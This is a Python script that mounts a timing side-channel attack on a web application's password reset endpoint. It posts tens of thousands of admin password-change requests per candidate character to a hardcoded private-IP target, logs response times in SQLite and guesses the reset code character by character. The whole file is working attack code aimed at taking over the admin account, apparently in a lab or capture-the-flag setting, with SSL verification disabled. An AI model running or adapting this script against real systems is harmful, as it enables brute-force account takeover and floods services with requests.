#!/usr/bin/env python3
import urllib3
import requests
import numpy
import multiprocessing
import sqlite3
import numpy

# NOTE: we should probably measure TTFB instead of simply how long the request took. libcurl?

# We assume the reset code is left at the default, 10 characters long alphanumeric
# Note: for debug/dev, the actual code is "67QJ481GxU"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321"

# We start off with a blank code with a length of 10 
bestGuess = "0000000000"

# Ignore SSL warnings
urllib3.disable_warnings()

def request_set(baseURL, code, sessID, reqNum, position, dbq):
	"""Perform a set of requests to gague the timing for a certain character in a certain position"""
	# If we use 50,000 reqs per charcater, that's 31 million requests for the entire code. Buckle up.

	def single_request(baseURL, code, sessID):
		"""Perform a single request"""
		# 'code' is our current guess. If we're guessing position 3, it will look something like: XXA0000000
		# 'A' is the charcater we're currently guessing and 'XX' are two characters guessed prior.
		postData = {"user":"admin", "password":"password", "password_confirm":"password", "code":code}
		myReq = requests.post(baseURL+"/reset/", postData, cookies={"PHPSESSID":sessID}, verify=False)
		return myReq.elapsed.microseconds
	
	counter = 0
	for _ in range(reqNum):
		if counter % 1000 == 0:
			print("Trying code: {} ({}/{}, ~{}%)".format(code, _, reqNum, round(_/reqNum*100)))
		counter += 1
		try:
			time = single_request(baseURL, code, sessID)
			dbq.put((position,code,time))
		except Exception as e:
			print("Error during request: {}\nContinuing...".format(e))

def do_guess(myCharset, baseURL, sessID, current, position, dbq):
	"""Code to be threaded and used by guess_single_position"""
	code = ""
	for guess in myCharset:
		print("do_guess thread running on character '{}'".format(guess))
		code = current.replace("_", guess)
		request_set(baseURL, code, sessID, 50000, position, dbq)
		print("do_guess thread finished for character '{}'".format(guess))

def guess_single_position(position, baseURL, sessID, dbq):
	"""Gather times for each potential of the current position"""

	# AB_0000000
	current = bestGuess[:position] + "_" + bestGuess[position+1:]
	print("\nGuessing: {}".format(current))

	# For each character in the character set, perform a request set to get the times for that guess
	threads = 4
	# Splits the input character set into approximately even ranges
	size = round(len(charset)/threads)
	splitSets = [charset[pos:pos + size] for pos in range(0, len(charset), size)]

	print("Splitting into {} subprocesses ...".format(threads))
	procList = []
	for thread in range(threads):
		print("Starting process {}".format(thread))
		p = multiprocessing.Process(
			target=do_guess,
			args=( splitSets[thread], baseURL, sessID, current, position, dbq )
		)
		procList.append(p)
		p.start()

	print("Entering wait loop for request threads to finish")
	stillWaiting = True 
	while stillWaiting is True:
		stillWaiting = False 
		for thread in range(threads):
			print("Waiting 30s for thread {}/{} ...".format(thread, threads))
			procList[thread].join(30)
			exitCode = procList[thread].exitcode
			if exitCode != None:
				print("Thread joined")
			else:
				print("Process still running")
		for thread in range(threads):
			if procList[thread].is_alive():
				stillWaiting = True

	# At this stage, our request threads have finished and our time data is in the database
	def guess_character_from_times(position):
		global bestGuess

		# Shamelessly stolen from StackOverflow, cheers @benjamin-bannier
		def reject_outliers(data, m = 2.):
			data = numpy.array(data)
			d = numpy.abs(data - numpy.median(data))
			mdev = numpy.median(d)
			s = d/mdev if mdev else 0.
			return data[s<m]

		print("Performing magic")
		dbCon = sqlite3.connect("timeAttack.db")
		c = dbCon.cursor()
		c.execute("SELECT code,time from times where position=?", (position,))
		times = c.fetchall()

		calcTimes = {}
		for code,time in times:
			if code in calcTimes:
				calcTimes[code].append(time)
			else:
				calcTimes[code] = [time]
		del times

		for code in calcTimes:
			# Remove outliers
			calcTimes[code] = reject_outliers(calcTimes[code])
			calcTimes[code] = numpy.average(calcTimes[code])

		calVals = list(calcTimes.values())
		calKeys = list(calcTimes.keys())
		for _ in range(3):
			pos = calVals.index(max(calVals))
			char = calKeys[pos][position]
			print("Found #{} best guess for position {}: '{}' with {}".format(_, position, char, calVals[pos]))
			calVals.pop(pos)
			calKeys.pop(pos)
		bestGuess = bestGuess[:position] + char + bestGuess[position+1:]
		print("Updating bestGuess to '{}'".format(bestGuess))

		# Cleanup
		print("Deleting accumulated times from database for position {}".format(position))
		c.execute("DELETE FROM times")

	guess_character_from_times(position)

def db_worker(insertQueue):
	"""Takes items from the insertQueue and updates the database"""
	from queue import Empty as queueEmpty, Full as queueFull

	# Open up our DB
	dbCon = sqlite3.connect("timeAttack.db")
	c = dbCon.cursor()

	# Are we resuming or starting anew?
	c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='times'")
	resume = (False if c.fetchone() == None else True)
	if not resume:
		c.execute("CREATE TABLE times (position int, code text, time real)")
		dbCon.commit()

	retries = 3
	counter = 0
	while retries is not 0:
		try:
			# Save to file after every 10 requests
			if counter % 10 == 0:
				dbCon.commit()
				counter = 0
			newTime = insertQueue.get(block=True, timeout=10)
			c.execute("INSERT INTO times (position, code, time) VALUES (?,?,?)", newTime)
			counter += 1
		except queueEmpty:
			print("DB insert queue empty! Retrying {} more times...".format(retries))
			retries -= 1
		except Exception as unexex:
			print("Unexpected error occured!")
			print(unexex)

def start_time_attack(baseURL):
	"""Iterate over each position in the code, get the best guess for each position and repeat"""

	print("Grabbing PHPSESSID cookie... ", end="")
	# Go to login page to get a PHPSESSID, ignore invalid SSL certificates
	myReq = requests.get(baseURL + "/login", verify=False)
	sessID = myReq.cookies["PHPSESSID"]
	print("'{}'".format(sessID))

	# Setup the insert queue for the database
	insertQueue = multiprocessing.Queue()

	# Start our DB worker thread
	dbProc = multiprocessing.Process(target=db_worker, args=(insertQueue,))
	dbProc.start()

	# For each position in the reset code (the length of our inital guess)
	print("Starting time attack...")
	#for position in range(len(bestGuess)):
	#for position in range(len(bestGuess)):
	
	# Guess that position, using the database to store times and update the bestGuess
	guess_single_position(0, baseURL, sessID, insertQueue)
	guess_single_position(1, baseURL, sessID, insertQueue)

	# By now, we've performed ~31m reqs (50,000 * 10 * 62) and have a bestGuess for the code.
	print("\nTime attack finished. Best guess for code: {}\n".format(bestGuess))

if __name__ == "__main__":
	# import sys
	# baseURL = sys.argv[1] 
	baseURL = "https://10.20.30.20:8083/"

	# Fastest method on *NIX
	multiprocessing.set_start_method("forkserver")

	# Lets go
	start_time_attack(baseURL)
